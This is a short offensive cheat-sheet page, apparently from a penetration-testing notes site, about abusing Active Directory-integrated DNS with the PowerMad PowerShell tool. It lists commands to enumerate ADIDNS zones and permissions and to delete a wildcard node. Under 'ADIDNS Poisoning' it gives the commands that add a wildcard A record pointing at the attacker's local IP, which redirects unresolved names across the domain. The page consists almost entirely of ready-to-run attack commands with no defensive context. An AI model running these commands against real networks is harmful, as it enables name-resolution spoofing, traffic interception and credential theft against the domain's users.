---
title: "ADIDNS"
date: 2024-11-9
tags: ["Domain", "ADIDNS", "ADDS", "DNS", "PowerMad", "DNS Posioning", "Spoofing", "Windows", "Active Directory"]
---

### Basic

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import Module

```console
. .\Powermad.ps1
```

#### 2. Enum

```console
# Get ADIDNS Zone
Get-ADIDNSZone
```

```console
# Get ADIDNS Permissions
Get-ADIDNSPermission
```

```console
# Remove a Node
Remove-ADIDNSNode -Node *
```

{{< /tabcontent >}}

### Abuse #1: ADIDNS Poisoning

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import Module

```console
. .\Powermad.ps1
```

#### 2. Create a New Node

```console
$dnsRecord = New-DNSRecordArray -Type A -Data <LOCAL_IP>
```

```console
New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose
```

#### 3. Check

```console
Resolve-DnsName DoesNotExist
```

{{< /tabcontent >}}